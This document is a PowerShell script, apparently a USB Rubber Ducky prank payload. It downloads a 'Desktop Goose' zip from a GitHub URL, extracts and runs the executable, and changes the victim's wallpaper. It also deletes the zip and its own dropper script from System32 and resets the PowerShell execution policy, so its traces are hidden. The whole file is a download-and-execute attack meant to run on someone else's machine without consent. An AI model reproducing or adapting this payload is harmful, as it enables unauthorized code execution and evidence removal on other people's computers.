cd C:\Users\Public\
wget "https://github.com/csandoval63/GooseDesktopRubberDucky/blob/master/Desktop%20Goose%20v0.21.zip?raw=true" -outfile "Goose.zip"
Expand-Archive .\Goose.zip
cd Goose
.\GooseDesktop.exe
cd ..
Remove-Item .\Goose.zip
cd C:\Windows\System32
Remove-Item .\helloGoose.ps1
set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value C:\Users\Public\Goose\Assets\Images\Memes\wallpaper.png
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
powershell Set-ExecutionPolicy Default
powershell Set-ExecutionPolicy -scope CurrentUser Default
exit
